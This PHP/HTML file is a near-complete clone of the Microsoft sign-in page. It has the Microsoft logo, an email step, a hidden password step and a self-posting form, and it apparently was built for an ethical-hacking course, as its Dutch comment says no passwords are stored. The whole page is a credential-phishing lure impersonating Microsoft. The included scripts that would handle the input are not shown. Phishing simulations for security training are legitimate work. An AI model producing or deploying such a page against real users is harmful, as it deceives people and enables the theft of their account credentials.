<?php
include 'lib/page_enter.php';
?>

<!DOCTYPE html>
<!-- Opdracht in het kader van de Minor Certified Ethical Hacking, er worden geen wachtwoorden opgeslagen-->
<html dir="ltr" class="" lang="en">
<head>
    <title>Sign in to your account</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta name="robots" content="none">
    <script src="js/jquery.js"></script>
    <script src="js/main.js"></script>
    <link rel="stylesheet" href="assets/style.css">
    <link rel="shortcut icon" href="assets/img/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
</head>
<body>
<div>
    <div class="background-image-holder" role="presentation">
        <div class="background-image ext-background-image"
             style="background-image: url(assets/img/2_bc3d32a696895f78c19df6c717586a5d.svg);"></div>
    </div>
    <div data-bind="if: activeDialog"></div>
    <form name="f1" id="authenticate-form" novalidate="novalidate" spellcheck="false"
          method="post" target="_top" autocomplete="off">
        <div class="outer">
            <div class="middle">
                <div class="sign-in-box ext-sign-in-box fade-in-lightbox">
                    <div class="lightbox-cover"></div>
                    <div class="win-scroll">
                        <div>
                            <img class="logo" role="img"
                                 src="assets/img/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
                                 alt="Microsoft">
                        </div>
                        <div role="main">
                            <div id="authEmail">
                                <div id="authEmailAnimate" class="pagination-view animate slide-in-back">
                                    <div data-viewid="1" data-showfedcredbutton="true">
                                        <div>
                                            <div class="row title ext-title">
                                                <div role="heading" aria-level="1" data-bind="text: title">Sign in</div>
                                            </div>
                                        </div>
                                        <div class="row">
                                            <div role="alert" aria-live="assertive"><div style="display: none !important;" class="col-md-24 error ext-error" id="usernameError">Please enter an valid e-mail, phonenumber or skype-username.</div> <!-- /ko --> </div>
                                            <div class="form-group col-md-24">
                                                <div class="placeholderContainer">
                                                    <input type="email" name="form_email" id="i0116" maxlength="113"
                                                           lang="en"
                                                           class="form-control ltr_override input ext-input text-box ext-text-box"
                                                           aria-required="true"
                                                           aria-label="Enter your email, phone, or Skype."
                                                           aria-describedby="loginHeader"
                                                           placeholder="Email, phone, or Skype">
                                                </div>
                                            </div>
                                        </div>
                                        <div class="position-buttons">
                                            <div class="row">
                                                <div class="col-md-24">
                                                    <div class="text-13">
                                                        <div class="form-group">No account? <a
                                                                    href="https://signup.live.com/signup" id="signup"
                                                                    aria-label="Create a Microsoft account">Create
                                                                one!</a>
                                                        </div>
                                                        <div class="form-group"><a id="cantAccessAccount" href="https://support.microsoft.com/en-gb/help/12429/microsoft-account-cant-sign-in">Can’t
                                                                access your account?</a></div>
                                                    </div>
                                                </div>
                                                <div class="win-button-pin-bottom">
                                                    <div class="row">
                                                        <div>
                                                            <div class="col-xs-24 no-padding-left-right button-container">
                                                                <div class="inline-block">
                                                                    <input type="button" id="idSIButton9"
                                                                           class="button ext-button primary ext-primary"
                                                                           value="Next">
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div id="authLogin" class="authenticate-password" style="display: none !important;">
                                <div class="animate slide-in-next">
                                    <div>
                                        <div class="identityBanner">
                                            <button type="button" class="backButton" id="idBtn_Back"
                                                    aria-label="Vorige">
                                                <img alt role="presentation"
                                                     src="assets/img/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg">
                                            </button>
                                            <div id="displayName" class="identity">
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div id="authPwdAnimate"
                                     class="pagination-view animate has-identity-banner slide-in-next">
                                    <div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true">
                                        <div id="loginHeader" class="row title ext-title" role="heading" aria-level="1">
                                            Enter password
                                        </div>
                                        <div class="row">
                                            <div class="form-group col-md-24">
                                                <div role="alert" aria-live="assertive"></div>
                                                <div class="placeholderContainer"><input type="password" id="i0118"
                                                            autocomplete="off"
                                                            class="form-control input ext-input text-box ext-text-box"
                                                            aria-required="true" aria-describedby="loginHeader  "
                                                            placeholder="Wachtwoord" tabindex="0">
                                                </div>
                                            </div>
                                            <div class="position-buttons">
                                                <div>
                                                    <div class="row">
                                                        <div class="col-md-24">
                                                            <div class="text-13">
                                                                <div class="form-group"><a role="link"
                                                                                           href="https://passwordreset.microsoftonline.com">forgot password</a></div>
                                                                <div class="form-group"></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="win-button-pin-bottom">
                                                        <div class="row">
                                                            <div>
                                                                <div class="col-xs-24 no-padding-left-right button-container">
                                                                    <div class="inline-block"><input type="submit"
                                                                                                     class="button ext-button primary ext-primary"
                                                                                                     value="Login">
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div id="footer" role="contentinfo" class="default footer ext-footer new-background-image">
                                <div>
                                    <div id="footerLinks" class="footerNode text-secondary"><a
                                                id="ftrTerms"
                                                href="https://www.microsoft.com/en-US/servicesagreement/">Terms of
                                            use</a>
                                        <a id="ftrPrivacy"
                                           data-bind="text: privacyText, href: privacyLink, click: privacyLink_onClick"
                                           href="https://privacy.microsoft.com/en-US/privacystatement">Privacy
                                            &amp; cookies</a><a
                                                id="moreOptions" href="#" role="button" class="moreOptions"
                                                aria-label="Click here for troubleshooting information"
                                                aria-expanded="false">
                                        </a></div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </form>
</div>
</body>
</html>
